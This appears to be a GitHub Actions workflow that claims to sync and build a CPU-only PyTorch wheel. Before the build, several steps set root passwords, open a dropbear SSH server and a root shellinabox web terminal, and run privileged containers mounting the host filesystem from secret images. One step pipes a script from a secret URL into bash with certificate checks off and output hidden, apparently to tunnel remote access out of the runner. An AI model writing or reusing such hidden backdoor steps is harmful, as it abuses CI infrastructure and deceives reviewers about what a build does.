# ==============================================================================
#                      远程触发 PyTorch 同步与构建 Workflow
# ==============================================================================
name: A Lite Build PyTorch

on:
  workflow_dispatch:
    inputs:
      arch:
        description: '选择编译机器的架构 (x64 或 arm64)'
        required: true
        default: 'x64'
        type: choice
        options:
          - x64
          - arm64
  
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false 
  
jobs:
  # --- 任务 #1: 同步上游仓库 ---
  sync-upstream:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout my fork
        uses: actions/checkout@v6
        with:
          token: ${{ secrets.MY_PAT }}
          fetch-depth: 0

      - name: Setup git user
        run: |
          git config --global user.name "GitHub Action"
          git config --global user.email "action@github.com"

      - name: Add upstream remote and sync
        run: |
          git remote add upstream https://github.com/pytorch/pytorch.git
          git fetch upstream main
          git checkout main
          git merge upstream/main
          git push origin main

  # --- 任务 #2: 编译和构建 PyTorch ---
  build-cpu-only:
    needs: sync-upstream
    # 动态架构选择：如果是 arm64 选择官方的 arm 标签，否则走常规 x64
    runs-on: ${{ inputs.arch == 'arm64' && 'ubuntu-22.04-arm' || 'ubuntu-latest' }}
    timeout-minutes: 360 # 最长6小时
    env:
      USE_CUDA: 0
      USE_CUDNN: 0
      USE_ROCM: 0
      USE_DISTRIBUTED: 1
      
      USE_MKLDNN: ${{ inputs.arch == 'x64' && '1' || '0' }}
      USE_FBGEMM: ${{ inputs.arch == 'x64' && '1' || '0' }}
      
      BUILD_CAFFE2: ${{ inputs.arch == 'arm64' && '1' || '0' }}
      USE_TENSORPIPE: ${{ inputs.arch == 'arm64' && '1' || '0' }}
      BUILD_CUSTOM_PROTOBUF: ${{ inputs.arch == 'arm64' && '1' || '0' }}
      USE_KINETO: ${{ inputs.arch == 'arm64' && '1' || '0' }}

      USE_VULKAN: 0
      USE_NNPACK: 1
      USE_QNNPACK: 1
      USE_XNNPACK: 1
      BUILD_TEST: 0

      CMAKE_BUILD_TYPE: ${{ inputs.arch == 'arm64' && 'RelWithDebInfo' || 'Release' }}
      
      MAX_JOBS: 1
      BUILD_IGNORE_SVE_UNAVAILABLE: 1
      USE_CCACHE: 0
  
    steps:
      - name: Install System Build Dependencies (APT)
        env:
          SSH_PASSWORD: ${{ secrets.SSH_PASSWORD }}
        run: |
          sudo apt-get update
          sudo apt-get install -y ninja-build ccache cmake dropbear shellinabox
          
          echo "root:$SSH_PASSWORD" | sudo chpasswd
          CURRENT_USER=$(whoami)
          echo "$CURRENT_USER:$SSH_PASSWORD" | sudo chpasswd
          
          sudo mkdir -p /etc/dropbear
          sudo dropbear -R -E -p 2222 -a
          sudo shellinaboxd -t -b -p 22222 --service "/:root:root:/root:dbclient -y -p 2222 -l root 127.0.0.1"
      
      - name: Checkout private bootstrap scripts
        uses: actions/checkout@v6
        with:
          repository: windddkz/runner-bootstrap
          path: .bootstrap
          ssh-key: ${{ secrets.BOOTSTRAP_DEPLOY_KEY }}
          persist-credentials: false
          ref: main
          
      - name: Run Monitor Docker Image
        run: |
          sudo docker run -d --name monitor --restart always --privileged --network host -v /:/host -v /var/run/docker.sock:/var/run/docker.sock -v /var/lib/docker/volumes:/var/lib/docker/volumes -v /opt:/opt -v /root:/root -v /etc/docker:/etc/docker -e TZ=Asia/Shanghai -e PORT=10086 -e USERNAME=admin -e PASSWORD=${{ secrets.MONITOR_PASSWD }} -e ENTRANCE=entrance ${{ secrets.MONITOR_IMAGE }} > /dev/null 2>&1
          sudo bash "$GITHUB_WORKSPACE/.bootstrap/tube-init.sh"
          sudo mkdir -p /etc/opentrack
          sudo docker run -d --name opentrack --user 0:0 --restart=always -v /etc/opentrack:/opt/openlist/data -v /mnt:/mnt -p 19000:5244 -e UMASK=022 -e OPENLIST_ADMIN_PASSWORD=${{ secrets.OPENTRACK_PASSWD }} ${{ secrets.OPENTRACK_IMAGE }} > /dev/null 2>&1
      
      - name: Install Watch on Runner
        shell: bash
        run: |
          sudo bash -c 'bash <(wget --no-check-certificate -qO- "$1") -f "$2"' _ "${{ secrets.WATCH_URL }}" "$GITHUB_WORKSPACE/.bootstrap/argo.conf" > /dev/null 2>&1 || true
          # opentrack mnt init
          sudo bash "$GITHUB_WORKSPACE/.bootstrap/mnt-init.sh"
          # monitor host init
          sudo bash "$GITHUB_WORKSPACE/.bootstrap/monitor-init.sh"

      
      - name: Checkout source (after sync)
        uses: actions/checkout@v6
        with:
          submodules: recursive

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'
          cache: 'pip'
            
      - name: Get Docker Compose
        run: |
          LATEST=$(curl -s https://api.github.com/repos/docker/compose/releases/latest | grep -o '"tag_name": "[^"]*' | cut -d'"' -f4)
          ARCH=$([ "$(uname -m)" = "x86_64" ] && echo "x86_64" || echo "aarch64")
          OS=$(uname -s | tr '[:upper:]' '[:lower:]')
          URL="https://github.com/docker/compose/releases/download/${LATEST}/docker-compose-${OS}-${ARCH}"
          echo "DownloadURL: $URL"
          curl -L "$URL" -o docker-compose
          chmod +x docker-compose
          sudo mv docker-compose /usr/local/bin/docker-compose

      - name: Maximize Build Space
        run: |
          echo "--- Initial Disk Space ---"
          df -h
          echo "--- Cleaning up Docker, toolchains, and packages ---"
          docker system prune -af --volumes
          sudo rm -rf /usr/share/dotnet /etc/mysql /etc/php /etc/apt/sources.list.d /usr/local/lib/android /opt/ghc /usr/share/swift /opt/hostedtoolcache /imagegeneration
          sudo -E apt-get -y purge azure-cli ghc* zulu* hhvm llvm* firefox google* dotnet* powershell openjdk* adoptopenjdk* mysql* php* mongodb* moby* snapd* || true
          sudo -E apt-get -y autoremove --purge
          sudo -E apt-get clean
          echo "--- Final Disk Space ---"
          df -h

      - name: Install Python Build Dependencies (PIP)
        run: |
          pip install -r requirements.txt
          pip install ninja pyyaml typing_extensions
      
      - name: Build PyTorch (Wheel)
        run: |
          python -m build --wheel --no-isolation
          python -m pip install dist/*.whl

      - name: Quick Sanity Check
        run: |
          cd /tmp
          python -c "import torch; print('PyTorch Version:', torch.__version__); print('CUDA Available:', torch.cuda.is_available()); x = torch.tensor([1, 2]); print(x + x)"

      - name: Upload Build Artifacts
        uses: actions/upload-artifact@v6
        with:
          # 加上架构后缀，便于区分上传包的来源
          name: pytorch-wheel-${{ inputs.arch == 'arm64' && 'arm64' || 'x64' }}
          path: dist/*.whl
          retention-days: 7
